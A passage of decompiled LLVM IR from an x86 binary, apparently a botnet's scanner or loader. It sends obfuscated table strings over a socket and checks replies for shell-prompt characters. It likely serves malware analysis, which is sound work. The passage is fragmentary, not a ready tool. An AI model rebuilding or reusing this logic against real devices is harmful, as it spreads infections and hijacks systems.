  %v2_804f9c4 = inttoptr i32 %v1_804f9c4 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_804f9c4, align 4
  %v0_804f9c9 = load i32, i32* @esi, align 4
  %v1_804f9c9 = add i32 %v0_804f9c9, 4
  %v2_804f9c9 = inttoptr i32 %v1_804f9c9 to i32*
  %v3_804f9c9 = load i32, i32* %v2_804f9c9, align 4
  store i32 %v3_804f9c9, i32* %ecx.global-to-local, align 4
  %v2_804f9cc = add i32 %v0_804f9ba, 16
  %v3_804f9cc = inttoptr i32 %v2_804f9cc to i32*
  store i32 %v3_804f9c9, i32* %v3_804f9cc, align 4
  %v0_804f9cd = load i32, i32* %stack_var_-16, align 4
  %v4_804f9cd = call i32 @__libc_send(i32 %v0_804f9cd, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804f9cd, i32* %eax.global-to-local, align 4
  %v0_804f9d2 = load i32, i32* @esp, align 4
  %v1_804f9d2 = inttoptr i32 %v0_804f9d2 to i32*
  store i32 27, i32* %v1_804f9d2, align 4
  %v0_804f9d9 = load i32, i32* %stack_var_-16, align 4
  %v1_804f9d9 = trunc i32 %v0_804f9d9 to i8
  %v2_804f9d9 = call i32 @table_lock_val(i8 %v1_804f9d9)
  store i32 %v2_804f9d9, i32* %eax.global-to-local, align 4
  %v0_804f9e1 = load i32, i32* @esi, align 4
  %v1_804f9e1 = add i32 %v0_804f9e1, 12
  %v2_804f9e1 = inttoptr i32 %v1_804f9e1 to i32*
  store i32 9, i32* %v2_804f9e1, align 4
  br label %dec_label_pc_804f848

dec_label_pc_804f9ed:                             ; preds = %dec_label_pc_804f7b7
  %v1_804f9ed = add i32 %v0_804f7b7, 24
  %v2_804f9ed = inttoptr i32 %v1_804f9ed to i32*
  %v3_804f9ed = load i32, i32* %v2_804f9ed, align 4
  store i32 %v3_804f9ed, i32* %ecx.global-to-local, align 4
  %v1_804f9f0 = add i32 %v3_804f9ed, -1
  store i32 %v1_804f9f0, i32* %eax.global-to-local, align 4
  %tmp169 = icmp slt i32 %v1_804f9f0, 1
  br i1 %tmp169, label %dec_label_pc_804f740.backedge, label %dec_label_pc_804f9fb

dec_label_pc_804f9fb:                             ; preds = %dec_label_pc_804f9ed
  %v2_804f9fb = add i32 %v0_804f7b7, 28
  %v3_804f9fb = add i32 %v1_804f9f0, %v2_804f9fb
  %v4_804f9fb = inttoptr i32 %v3_804f9fb to i8*
  %v5_804f9fb = load i8, i8* %v4_804f9fb, align 1
  %v6_804f9fb = zext i8 %v5_804f9fb to i32
  %v7_804f9fb = load i32, i32* @edx, align 4
  %v8_804f9fb = and i32 %v7_804f9fb, -256
  %v9_804f9fb = or i32 %v8_804f9fb, %v6_804f9fb
  store i32 %v9_804f9fb, i32* %edx.global-to-local, align 4
  %v10_804f9ff = icmp eq i8 %v5_804f9fb, 58
  br i1 %v10_804f9ff, label %dec_label_pc_804fa44, label %dec_label_pc_804fa04

dec_label_pc_804fa04:                             ; preds = %dec_label_pc_804f9fb
  %v10_804fa04 = icmp eq i8 %v5_804f9fb, 62
  br i1 %v10_804fa04, label %dec_label_pc_804fa44, label %dec_label_pc_804fa09

dec_label_pc_804fa09:                             ; preds = %dec_label_pc_804fa04
  %v10_804fa09 = icmp eq i8 %v5_804f9fb, 36
  br i1 %v10_804fa09, label %dec_label_pc_804fa44, label %dec_label_pc_804fa0e

dec_label_pc_804fa0e:                             ; preds = %dec_label_pc_804fa09
  %v10_804fa0e = icmp eq i8 %v5_804f9fb, 35
  br i1 %v10_804fa0e, label %dec_label_pc_804fa44, label %dec_label_pc_804fa13

dec_label_pc_804fa13:                             ; preds = %dec_label_pc_804fa0e
  %v3_804fa13 = add i32 %v3_804f9ed, %v2_804f9fb
  store i32 %v3_804fa13, i32* %ecx.global-to-local, align 4
  %v10_804fa17 = icmp eq i8 %v5_804f9fb, 37
  %v1_804fa1a = icmp eq i1 %v10_804fa17, false
  br i1 %v1_804fa1a, label %dec_label_pc_804fa35, label %dec_label_pc_804fa44

dec_label_pc_804fa20:                             ; preds = %dec_label_pc_804fa3c
  %v10_804fa20 = icmp eq i8 %v3_804fa3c, 62
  br i1 %v10_804fa20, label %dec_label_pc_804fa44, label %dec_label_pc_804fa25

dec_label_pc_804fa25:                             ; preds = %dec_label_pc_804fa20
  %v10_804fa25 = icmp eq i8 %v3_804fa3c, 36
  br i1 %v10_804fa25, label %dec_label_pc_804fa44, label %dec_label_pc_804fa2a

dec_label_pc_804fa2a:                             ; preds = %dec_label_pc_804fa25
  %v10_804fa2a = icmp eq i8 %v3_804fa3c, 35
  br i1 %v10_804fa2a, label %dec_label_pc_804fa44, label %dec_label_pc_804fa2f

dec_label_pc_804fa2f:                             ; preds = %dec_label_pc_804fa2a
  %v1_804fa2f = add i32 %v0_804fa2f, -1
  store i32 %v1_804fa2f, i32* %ecx.global-to-local, align 4
  %v10_804fa30 = icmp eq i8 %v3_804fa3c, 37
  br i1 %v10_804fa30, label %dec_label_pc_804fa44, label %dec_label_pc_804fa35

dec_label_pc_804fa35:                             ; preds = %dec_label_pc_804fa13, %dec_label_pc_804fa2f
  %v5_804fa3c = phi i32 [ %v7_804fa3c, %dec_label_pc_804fa2f ], [ %v9_804f9fb, %dec_label_pc_804fa13 ]
  %v0_804fa2f = phi i32 [ %v1_804fa2f, %dec_label_pc_804fa2f ], [ %v3_804fa13, %dec_label_pc_804fa13 ]
  %v0_804fa35 = phi i32 [ %v1_804fa35, %dec_label_pc_804fa2f ], [ %v1_804f9f0, %dec_label_pc_804fa13 ]
  %v1_804fa35 = add i32 %v0_804fa35, -1
  %v8_804fa35 = icmp eq i32 %v1_804fa35, 0
  store i32 %v1_804fa35, i32* %eax.global-to-local, align 4
  br i1 %v8_804fa35, label %dec_label_pc_804f740.backedge, label %dec_label_pc_804fa3c

dec_label_pc_804fa3c:                             ; preds = %dec_label_pc_804fa35
  %v1_804fa3c = add i32 %v0_804fa2f, -2
  %v2_804fa3c = inttoptr i32 %v1_804fa3c to i8*
  %v3_804fa3c = load i8, i8* %v2_804fa3c, align 1
  %v4_804fa3c = zext i8 %v3_804fa3c to i32
  %v6_804fa3c = and i32 %v5_804fa3c, -256
  %v7_804fa3c = or i32 %v4_804fa3c, %v6_804fa3c
  store i32 %v7_804fa3c, i32* %edx.global-to-local, align 4
  %v10_804fa3f = icmp eq i8 %v3_804fa3c, 58
  %v1_804fa42 = icmp eq i1 %v10_804fa3f, false
  br i1 %v1_804fa42, label %dec_label_pc_804fa20, label %dec_label_pc_804fa44

dec_label_pc_804fa44:                             ; preds = %dec_label_pc_804fa2f, %dec_label_pc_804fa2a, %dec_label_pc_804fa25, %dec_label_pc_804fa20, %dec_label_pc_804fa3c, %dec_label_pc_804fa13, %dec_label_pc_804fa0e, %dec_label_pc_804fa09, %dec_label_pc_804fa04, %dec_label_pc_804f9fb
  %v0_804fa47 = phi i32 [ %v1_804f9f0, %dec_label_pc_804fa13 ], [ %v1_804f9f0, %dec_label_pc_804fa0e ], [ %v1_804f9f0, %dec_label_pc_804fa09 ], [ %v1_804f9f0, %dec_label_pc_804fa04 ], [ %v1_804f9f0, %dec_label_pc_804f9fb ], [ %v1_804fa35, %dec_label_pc_804fa3c ], [ %v1_804fa35, %dec_label_pc_804fa20 ], [ %v1_804fa35, %dec_label_pc_804fa25 ], [ %v1_804fa35, %dec_label_pc_804fa2a ], [ %v1_804fa35, %dec_label_pc_804fa2f ]
  %v0_804fa44 = load i32, i32* @esp, align 4
  %v1_804fa47 = add i32 %v0_804fa47, 1
  store i32 %v1_804fa47, i32* @ebp, align 4
  %v1_804fa4a = add i32 %v0_804fa44, -16
  %v2_804fa4a = inttoptr i32 %v1_804fa4a to i32*
  store i32 24, i32* %v2_804fa4a, align 4
  %v0_804fa4c = load i32, i32* %stack_var_-16, align 4
  %v1_804fa4c = trunc i32 %v0_804fa4c to i8
  %v2_804fa4c = call i32 @table_unlock_val(i8 %v1_804fa4c)
  store i32 %v2_804fa4c, i32* %eax.global-to-local, align 4
  %v0_804fa51 = load i32, i32* @esp, align 4
  %v1_804fa51 = inttoptr i32 %v0_804fa51 to i32*
  %v2_804fa51 = load i32, i32* %v1_804fa51, align 4
  store i32 %v2_804fa51, i32* %eax.global-to-local, align 4
  %v3_804fa51 = add i32 %v0_804fa51, 4
  %v1_804fa52 = inttoptr i32 %v3_804fa51 to i32*
  %v2_804fa52 = load i32, i32* %v1_804fa52, align 4
  store i32 %v2_804fa52, i32* %edx.global-to-local, align 4
  %v1_804fa53 = add i32 %v0_804fa51, 1880
  store i32 %v1_804fa53, i32* %ecx.global-to-local, align 4
  store i32 %v1_804fa53, i32* %v1_804fa52, align 4
  store i32 24, i32* %v1_804fa51, align 4
  %v0_804fa5d = load i32, i32* %stack_var_-16, align 4
  %v3_804fa5d = call i32 @table_retrieve_val(i32 %v0_804fa5d, i32* %v2_8050185)
  store i32 %v3_804fa5d, i32* %eax.global-to-local, align 4
  %v0_804fa62 = load i32, i32* @esp, align 4
  %v1_804fa62 = add i32 %v0_804fa62, -4
  %v2_804fa62 = inttoptr i32 %v1_804fa62 to i32*
  store i32 16384, i32* %v2_804fa62, align 4
  %v1_804fa67 = add i32 %v0_804fa62, 1880
  %v2_804fa67 = inttoptr i32 %v1_804fa67 to i32*
  %v3_804fa67 = load i32, i32* %v2_804fa67, align 4
  %v2_804fa6e = add i32 %v0_804fa62, -8
  %v3_804fa6e = inttoptr i32 %v2_804fa6e to i32*
  store i32 %v3_804fa67, i32* %v3_804fa6e, align 4
  %v2_804fa6f = add i32 %v0_804fa62, -12
  %v3_804fa6f = inttoptr i32 %v2_804fa6f to i32*
  store i32 %v3_804fa5d, i32* %v3_804fa6f, align 4
  %v0_804fa70 = load i32, i32* @esi, align 4
  %v1_804fa70 = add i32 %v0_804fa70, 4
  %v2_804fa70 = inttoptr i32 %v1_804fa70 to i32*
  %v3_804fa70 = load i32, i32* %v2_804fa70, align 4
  store i32 %v3_804fa70, i32* @ebx, align 4
  %v2_804fa73 = add i32 %v0_804fa62, -16
  %v3_804fa73 = inttoptr i32 %v2_804fa73 to i32*
  store i32 %v3_804fa70, i32* %v3_804fa73, align 4
  %v0_804fa74 = load i32, i32* %stack_var_-16, align 4
  %v4_804fa74 = call i32 @__libc_send(i32 %v0_804fa74, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804fa74, i32* %eax.global-to-local, align 4
  %v0_804fa79 = load i32, i32* @esp, align 4
  %v1_804fa7c = add i32 %v0_804fa79, 28
  %v2_804fa7c = inttoptr i32 %v1_804fa7c to i32*
  store i32 16384, i32* %v2_804fa7c, align 4
  %v1_804fa81 = add i32 %v0_804fa79, 24
  %v2_804fa81 = inttoptr i32 %v1_804fa81 to i32*
  store i32 2, i32* %v2_804fa81, align 4
  %v1_804fa83 = add i32 %v0_804fa79, 20
  %v2_804fa83 = inttoptr i32 %v1_804fa83 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_804fa83, align 4
  %v0_804fa88 = load i32, i32* @esi, align 4
  %v1_804fa88 = add i32 %v0_804fa88, 4
  %v2_804fa88 = inttoptr i32 %v1_804fa88 to i32*
  %v3_804fa88 = load i32, i32* %v2_804fa88, align 4
  store i32 %v3_804fa88, i32* %ecx.global-to-local, align 4
  %v2_804fa8b = add i32 %v0_804fa79, 16
  %v3_804fa8b = inttoptr i32 %v2_804fa8b to i32*
  store i32 %v3_804fa88, i32* %v3_804fa8b, align 4
  %v0_804fa8c = load i32, i32* %stack_var_-16, align 4
  %v4_804fa8c = call i32 @__libc_send(i32 %v0_804fa8c, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804fa8c, i32* %eax.global-to-local, align 4
  %v0_804fa91 = load i32, i32* @esp, align 4
  %v1_804fa91 = inttoptr i32 %v0_804fa91 to i32*
  store i32 24, i32* %v1_804fa91, align 4
  %v0_804fa98 = load i32, i32* %stack_var_-16, align 4
  %v1_804fa98 = trunc i32 %v0_804fa98 to i8
  %v2_804fa98 = call i32 @table_lock_val(i8 %v1_804fa98)
  store i32 %v2_804fa98, i32* %eax.global-to-local, align 4
  %v0_804faa0 = load i32, i32* @esi, align 4
  %v1_804faa0 = add i32 %v0_804faa0, 12
  %v2_804faa0 = inttoptr i32 %v1_804faa0 to i32*
  store i32 8, i32* %v2_804faa0, align 4
  br label %dec_label_pc_804f848

dec_label_pc_804faac:                             ; preds = %dec_label_pc_804f7b7
  %v1_804faac = add i32 %v0_804f7b7, 24
  %v2_804faac = inttoptr i32 %v1_804faac to i32*
  %v3_804faac = load i32, i32* %v2_804faac, align 4
  store i32 %v3_804faac, i32* %ecx.global-to-local, align 4
  %v1_804faaf = add i32 %v3_804faac, -1
  store i32 %v1_804faaf, i32* %eax.global-to-local, align 4
  %tmp170 = icmp slt i32 %v1_804faaf, 1
  br i1 %tmp170, label %dec_label_pc_804f740.backedge, label %dec_label_pc_804faba

dec_label_pc_804faba:                             ; preds = %dec_label_pc_804faac
  %v2_804faba = add i32 %v0_804f7b7, 28
  %v3_804faba = add i32 %v1_804faaf, %v2_804faba
  %v4_804faba = inttoptr i32 %v3_804faba to i8*
  %v5_804faba = load i8, i8* %v4_804faba, align 1
  %v6_804faba = zext i8 %v5_804faba to i32
  %v7_804faba = load i32, i32* @edx, align 4
  %v8_804faba = and i32 %v7_804faba, -256
  %v9_804faba = or i32 %v8_804faba, %v6_804faba
  store i32 %v9_804faba, i32* %edx.global-to-local, align 4
  %v10_804fabe = icmp eq i8 %v5_804faba, 58
  br i1 %v10_804fabe, label %dec_label_pc_804fb04, label %dec_label_pc_804fac3

dec_label_pc_804fac3:                             ; preds = %dec_label_pc_804faba
  %v10_804fac3 = icmp eq i8 %v5_804faba, 62
  br i1 %v10_804fac3, label %dec_label_pc_804fb04, label %dec_label_pc_804fac8

dec_label_pc_804fac8:                             ; preds = %dec_label_pc_804fac3
  %v10_804fac8 = icmp eq i8 %v5_804faba, 36
  br i1 %v10_804fac8, label %dec_label_pc_804fb04, label %dec_label_pc_804facd

dec_label_pc_804facd:                             ; preds = %dec_label_pc_804fac8
  %v10_804facd = icmp eq i8 %v5_804faba, 35
  br i1 %v10_804facd, label %dec_label_pc_804fb04, label %dec_label_pc_804fad2

dec_label_pc_804fad2:                             ; preds = %dec_label_pc_804facd
  %v3_804fad2 = add i32 %v3_804faac, %v2_804faba
  store i32 %v3_804fad2, i32* %ecx.global-to-local, align 4
  %v10_804fad6 = icmp eq i8 %v5_804faba, 37
  %v1_804fad9 = icmp eq i1 %v10_804fad6, false
  br i1 %v1_804fad9, label %dec_label_pc_804faf5, label %dec_label_pc_804fb04

dec_label_pc_804fae0:                             ; preds = %dec_label_pc_804fafc
  %v10_804fae0 = icmp eq i8 %v3_804fafc, 62
  br i1 %v10_804fae0, label %dec_label_pc_804fb04, label %dec_label_pc_804fae5

dec_label_pc_804fae5:                             ; preds = %dec_label_pc_804fae0
  %v10_804fae5 = icmp eq i8 %v3_804fafc, 36
  br i1 %v10_804fae5, label %dec_label_pc_804fb04, label %dec_label_pc_804faea

dec_label_pc_804faea:                             ; preds = %dec_label_pc_804fae5
  %v10_804faea = icmp eq i8 %v3_804fafc, 35
  br i1 %v10_804faea, label %dec_label_pc_804fb04, label %dec_label_pc_804faef

dec_label_pc_804faef:                             ; preds = %dec_label_pc_804faea
  %v1_804faef = add i32 %v0_804faef, -1
  store i32 %v1_804faef, i32* %ecx.global-to-local, align 4
  %v10_804faf0 = icmp eq i8 %v3_804fafc, 37
  br i1 %v10_804faf0, label %dec_label_pc_804fb04, label %dec_label_pc_804faf5

dec_label_pc_804faf5:                             ; preds = %dec_label_pc_804fad2, %dec_label_pc_804faef
  %v5_804fafc = phi i32 [ %v7_804fafc, %dec_label_pc_804faef ], [ %v9_804faba, %dec_label_pc_804fad2 ]
  %v0_804faef = phi i32 [ %v1_804faef, %dec_label_pc_804faef ], [ %v3_804fad2, %dec_label_pc_804fad2 ]
  %v0_804faf5 = phi i32 [ %v1_804faf5, %dec_label_pc_804faef ], [ %v1_804faaf, %dec_label_pc_804fad2 ]
  %v1_804faf5 = add i32 %v0_804faf5, -1
  %v8_804faf5 = icmp eq i32 %v1_804faf5, 0
  store i32 %v1_804faf5, i32* %eax.global-to-local, align 4
  br i1 %v8_804faf5, label %dec_label_pc_804f740.backedge, label %dec_label_pc_804fafc

dec_label_pc_804fafc:                             ; preds = %dec_label_pc_804faf5
  %v1_804fafc = add i32 %v0_804faef, -2
  %v2_804fafc = inttoptr i32 %v1_804fafc to i8*
  %v3_804fafc = load i8, i8* %v2_804fafc, align 1
  %v4_804fafc = zext i8 %v3_804fafc to i32
  %v6_804fafc = and i32 %v5_804fafc, -256
  %v7_804fafc = or i32 %v4_804fafc, %v6_804fafc
  store i32 %v7_804fafc, i32* %edx.global-to-local, align 4
  %v10_804faff = icmp eq i8 %v3_804fafc, 58
  %v1_804fb02 = icmp eq i1 %v10_804faff, false
  br i1 %v1_804fb02, label %dec_label_pc_804fae0, label %dec_label_pc_804fb04

dec_label_pc_804fb04:                             ; preds = %dec_label_pc_804faef, %dec_label_pc_804faea, %dec_label_pc_804fae5, %dec_label_pc_804fae0, %dec_label_pc_804fafc, %dec_label_pc_804fad2, %dec_label_pc_804facd, %dec_label_pc_804fac8, %dec_label_pc_804fac3, %dec_label_pc_804faba
  %v0_804fb07 = phi i32 [ %v1_804faaf, %dec_label_pc_804fad2 ], [ %v1_804faaf, %dec_label_pc_804facd ], [ %v1_804faaf, %dec_label_pc_804fac8 ], [ %v1_804faaf, %dec_label_pc_804fac3 ], [ %v1_804faaf, %dec_label_pc_804faba ], [ %v1_804faf5, %dec_label_pc_804fafc ], [ %v1_804faf5, %dec_label_pc_804fae0 ], [ %v1_804faf5, %dec_label_pc_804fae5 ], [ %v1_804faf5, %dec_label_pc_804faea ], [ %v1_804faf5, %dec_label_pc_804faef ]
  %v0_804fb04 = load i32, i32* @esp, align 4
  %v1_804fb07 = add i32 %v0_804fb07, 1
  store i32 %v1_804fb07, i32* @ebp, align 4
  %v1_804fb0a = add i32 %v0_804fb04, -16
  %v2_804fb0a = inttoptr i32 %v1_804fb0a to i32*
  store i32 26, i32* %v2_804fb0a, align 4
  %v0_804fb0c = load i32, i32* %stack_var_-16, align 4
  %v1_804fb0c = trunc i32 %v0_804fb0c to i8
  %v2_804fb0c = call i32 @table_unlock_val(i8 %v1_804fb0c)
  store i32 %v2_804fb0c, i32* %eax.global-to-local, align 4
  %v0_804fb11 = load i32, i32* @esp, align 4
  %v1_804fb11 = inttoptr i32 %v0_804fb11 to i32*
  %v2_804fb11 = load i32, i32* %v1_804fb11, align 4
  store i32 %v2_804fb11, i32* %eax.global-to-local, align 4
  %v3_804fb11 = add i32 %v0_804fb11, 4
  %v1_804fb12 = inttoptr i32 %v3_804fb11 to i32*
  %v1_804fb13 = add i32 %v0_804fb11, 1880
  store i32 %v1_804fb13, i32* %edx.global-to-local, align 4
  store i32 %v1_804fb13, i32* %v1_804fb12, align 4
  store i32 26, i32* %v1_804fb11, align 4
  %v0_804fb1d = load i32, i32* %stack_var_-16, align 4
  %v3_804fb1d = call i32 @table_retrieve_val(i32 %v0_804fb1d, i32* %v2_8050185)
  store i32 %v3_804fb1d, i32* %eax.global-to-local, align 4
  %v0_804fb22 = load i32, i32* @esp, align 4
  %v1_804fb22 = add i32 %v0_804fb22, -4
  %v2_804fb22 = inttoptr i32 %v1_804fb22 to i32*
  store i32 16384, i32* %v2_804fb22, align 4
  %v1_804fb27 = add i32 %v0_804fb22, 1880
  %v2_804fb27 = inttoptr i32 %v1_804fb27 to i32*
  %v3_804fb27 = load i32, i32* %v2_804fb27, align 4
  %v2_804fb2e = add i32 %v0_804fb22, -8
  %v3_804fb2e = inttoptr i32 %v2_804fb2e to i32*
  store i32 %v3_804fb27, i32* %v3_804fb2e, align 4
  %v2_804fb2f = add i32 %v0_804fb22, -12
  %v3_804fb2f = inttoptr i32 %v2_804fb2f to i32*
  store i32 %v3_804fb1d, i32* %v3_804fb2f, align 4
  %v0_804fb30 = load i32, i32* @esi, align 4
  %v1_804fb30 = add i32 %v0_804fb30, 4
  %v2_804fb30 = inttoptr i32 %v1_804fb30 to i32*
  %v3_804fb30 = load i32, i32* %v2_804fb30, align 4
  store i32 %v3_804fb30, i32* @ebx, align 4
  %v2_804fb33 = add i32 %v0_804fb22, -16
  %v3_804fb33 = inttoptr i32 %v2_804fb33 to i32*
  store i32 %v3_804fb30, i32* %v3_804fb33, align 4
  %v0_804fb34 = load i32, i32* %stack_var_-16, align 4
  %v4_804fb34 = call i32 @__libc_send(i32 %v0_804fb34, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804fb34, i32* %eax.global-to-local, align 4
  %v0_804fb39 = load i32, i32* @esp, align 4
  %v1_804fb3c = add i32 %v0_804fb39, 28
  %v2_804fb3c = inttoptr i32 %v1_804fb3c to i32*
  store i32 16384, i32* %v2_804fb3c, align 4
  %v1_804fb41 = add i32 %v0_804fb39, 24
  %v2_804fb41 = inttoptr i32 %v1_804fb41 to i32*
  store i32 2, i32* %v2_804fb41, align 4
  %v1_804fb43 = add i32 %v0_804fb39, 20
  %v2_804fb43 = inttoptr i32 %v1_804fb43 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_804fb43, align 4
  %v0_804fb48 = load i32, i32* @esi, align 4
  %v1_804fb48 = add i32 %v0_804fb48, 4
  %v2_804fb48 = inttoptr i32 %v1_804fb48 to i32*
  %v3_804fb48 = load i32, i32* %v2_804fb48, align 4
  store i32 %v3_804fb48, i32* %ecx.global-to-local, align 4
  %v2_804fb4b = add i32 %v0_804fb39, 16
  %v3_804fb4b = inttoptr i32 %v2_804fb4b to i32*
  store i32 %v3_804fb48, i32* %v3_804fb4b, align 4
  %v0_804fb4c = load i32, i32* %stack_var_-16, align 4
  %v4_804fb4c = call i32 @__libc_send(i32 %v0_804fb4c, i32 %v0_804eda2, i32 %v0_804eda1, i32 %v0_804eda0)
  store i32 %v4_804fb4c, i32* %eax.global-to-local, align 4
  %v0_804fb51 = load i32, i32* @esp, align 4
  %v1_804fb51 = inttoptr i32 %v0_804fb51 to i32*
  store i32 26, i32* %v1_804fb51, align 4
  %v0_804fb58 = load i32, i32* %stack_var_-16, align 4
  %v1_804fb58 = trunc i32 %v0_804fb58 to i8
  %v2_804fb58 = call i32 @table_lock_val(i8 %v1_804fb58)
  store i32 %v2_804fb58, i32* %eax.global-to-local, align 4
  %v0_804fb60 = load i32, i32* @esi, align 4
  %v1_804fb60 = add i32 %v0_804fb60, 12
  %v2_804fb60 = inttoptr i32 %v1_804fb60 to i32*
  store i32 7, i32* %v2_804fb60, align 4
  br label %dec_label_pc_804f848

dec_label_pc_804fb6c:                             ; preds = %dec_label_pc_804f7b7
  %v1_804fb6c = add i32 %v0_804f7b7, 24
  %v2_804fb6c = inttoptr i32 %v1_804fb6c to i32*
  %v3_804fb6c = load i32, i32* %v2_804fb6c, align 4
  store i32 %v3_804fb6c, i32* %ecx.global-to-local, align 4
  %v1_804fb6f = add i32 %v3_804fb6c, -1
  store i32 %v1_804fb6f, i32* %eax.global-to-local, align 4
  %tmp171 = icmp slt i32 %v1_804fb6f, 1
  br i1 %tmp171, label %dec_label_pc_804f740.backedge, label %dec_label_pc_804fb7a

dec_label_pc_804fb7a:                             ; preds = %dec_label_pc_804fb6c
  %v2_804fb7a = add i32 %v0_804f7b7, 28
  %v3_804fb7a = add i32 %v1_804fb6f, %v2_804fb7a
  %v4_804fb7a = inttoptr i32 %v3_804fb7a to i8*
  %v5_804fb7a = load i8, i8* %v4_804fb7a, align 1
  %v6_804fb7a = zext i8 %v5_804fb7a to i32
  %v7_804fb7a = load i32, i32* @edx, align 4
  %v8_804fb7a = and i32 %v7_804fb7a, -256
  %v9_804fb7a = or i32 %v8_804fb7a, %v6_804fb7a
  store i32 %v9_804fb7a, i32* %edx.global-to-local, align 4
  %v10_804fb7e = icmp eq i8 %v5_804fb7a, 58
  br i1 %v10_804fb7e, label %dec_label_pc_804fbc4, label %dec_label_pc_804fb83

dec_label_pc_804fb83:                             ; preds = %dec_label_pc_804fb7a
  %v10_804fb83 = icmp eq i8 %v5_804fb7a, 62
  br i1 %v10_804fb83, label %dec_label_pc_804fbc4, label %dec_label_pc_804fb88

dec_label_pc_804fb88:                             ; preds = %dec_label_pc_804fb83
  %v10_804fb88 = icmp eq i8 %v5_804fb7a, 36
  br i1 %v10_804fb88, label %dec_label_pc_804fbc4, label %dec_label_pc_804fb8d

dec_label_pc_804fb8d:                             ; preds = %dec_label_pc_804fb88
  %v10_804fb8d = icmp eq i8 %v5_804fb7a, 35
  br i1 %v10_804fb8d, label %dec_label_pc_804fbc4, label %dec_label_pc_804fb92

dec_label_pc_804fb92:                             ; preds = %dec_label_pc_804fb8d
  %v3_804fb92 = add i32 %v3_804fb6c, %v2_804fb7a
  store i32 %v3_804fb92, i32* %ecx.global-to-local, align 4
  %v10_804fb96 = icmp eq i8 %v5_804fb7a, 37
  %v1_804fb99 = icmp eq i1 %v10_804fb96, false
  br i1 %v1_804fb99, label %dec_label_pc_804fbb5, label %dec_label_pc_804fbc4

dec_label_pc_804fba0:                             ; preds = %dec_label_pc_804fbbc
  %v10_804fba0 = icmp eq i8 %v3_804fbbc, 62
  br i1 %v10_804fba0, label %dec_label_pc_804fbc4, label %dec_label_pc_804fba5

dec_label_pc_804fba5:                             ; preds = %dec_label_pc_804fba0
  %v10_804fba5 = icmp eq i8 %v3_804fbbc, 36
  br i1 %v10_804fba5, label %dec_label_pc_804fbc4, label %dec_label_pc_804fbaa

dec_label_pc_804fbaa:                             ; preds = %dec_label_pc_804fba5
  %v10_804fbaa = icmp eq i8 %v3_804fbbc, 35
  br i1 %v10_804fbaa, label %dec_label_pc_804fbc4, label %dec_label_pc_804fbaf

dec_label_pc_804fbaf:                             ; preds = %dec_label_pc_804fbaa
  %v1_804fbaf = add i32 %v0_804fbaf, -1
  store i32 %v1_804fbaf, i32* %ecx.global-to-local, align 4
  %v10_804fbb0 = icmp eq i8 %v3_804fbbc, 37
  br i1 %v10_804fbb0, label %dec_label_pc_804fbc4, label %dec_label_pc_804fbb5

dec_label_pc_804fbb5:                             ; preds = %dec_label_pc_804fb92, %dec_label_pc_804fbaf
  %v5_804fbbc = phi i32 [ %v7_804fbbc, %dec_label_pc_804fbaf ], [ %v9_804fb7a, %dec_label_pc_804fb92 ]
  %v0_804fbaf = phi i32 [ %v1_804fbaf, %dec_label_pc_804fbaf ], [ %v3_804fb92, %dec_label_pc_804fb92 ]
  %v0_804fbb5 = phi i32 [ %v1_804fbb5, %dec_label_pc_804fbaf ], [ %v1_804fb6f, %dec_label_pc_804fb92 ]
  %v1_804fbb5 = add i32 %v0_804fbb5, -1
  %v8_804fbb5 = icmp eq i32 %v1_804fbb5, 0
  store i32 %v1_804fbb5, i32* %eax.global-to-local, align 4
  br i1 %v8_804fbb5, label %dec_label_pc_804f740.backedge, label %dec_label_pc_804fbbc

dec_label_pc_804fbbc:                             ; preds = %dec_label_pc_804fbb5
  %v1_804fbbc = add i32 %v0_804fbaf, -2
  %v2_804fbbc = inttoptr i32 %v1_804fbbc to i8*
  %v3_804fbbc = load i8, i8* %v2_804fbbc, align 1
  %v4_804fbbc = zext i8 %v3_804fbbc to i32
  %v6_804fbbc = and i32 %v5_804fbbc, -256
  %v7_804fbbc = or i32 %v4_804fbbc, %v6_804fbbc
  store i32 %v7_804fbbc, i32* %edx.global-to-local, align 4
  %v10_804fbbf = icmp eq i8 %v3_804fbbc, 58
  %v1_804fbc2 = icmp eq i1 %v10_804fbbf, false
  br i1 %v1_804fbc2, label %dec_label_pc_804fba0, label %dec_label_pc_804fbc4

dec_label_pc_804fbc4:                             ; preds = %dec_label_pc_804fbaf, %dec_label_pc_804fbaa, %dec_label_pc_804fba5, %dec_label_pc_804fba0, %dec_label_pc_804fbbc, %dec_label_pc_804fb92, %dec_label_pc_804fb8d, %dec_label_pc_804fb88, %dec_label_pc_804fb83, %dec_label_pc_804fb7a
  %v0_804fbc7 = phi i32 [ %v1_804fb6f, %dec_label_pc_804fb92 ], [ %v1_804fb6f, %dec_label_pc_804fb8d ], [ %v1_804fb6f, %dec_label_pc_804fb88 ], [ %v1_804fb6f, %dec_label_pc_804fb83 ], [ %v1_804fb6f, %dec_label_pc_804fb7a ], [ %v1_804fbb5, %dec_label_pc_804fbbc ], [ %v1_804fbb5, %dec_label_pc_804fba0 ], [ %v1_804fbb5, %dec_label_pc_804fba5 ], [ %v1_804fbb5, %dec_label_pc_804fbaa ], [ %v1_804fbb5, %dec_label_pc_804fbaf ]
  %v0_804fbc4 = load i32, i32* @esp, align 4
  %v1_804fbc7 = add i32 %v0_804fbc7, 1
  store i32 %v1_804fbc7, i32* @ebp, align 4
  %v1_804fbca = add i32 %v0_804fbc4, -16
  %v2_804fbca = inttoptr i32 %v1_804fbca to i32*
  store i32 25, i32* %v2_804fbca, align 4
  %v0_804fbcc = load i32, i32* %stack_var_-16, align 4
  %v1_804fbcc = trunc i32 %v0_804fbcc to i8
  %v2_804fbcc = call i32 @table_unlock_val(i8 %v1_804fbcc)
  store i32 %v2_804fbcc, i32* %eax.global-to-local, align 4
  %v0_804fbd1 = load i32, i32* @esp, align 4
  %v1_804fbd1 = inttoptr i32 %v0_804fbd1 to i32*
  %v2_804fbd1 = load i32, i32* %v1_804fbd1, align 4
  store i32 %v2_804fbd1, i32* %eax.global-to-local, align 4
  %v3_804fbd1 = add i32 %v0_804fbd1, 4
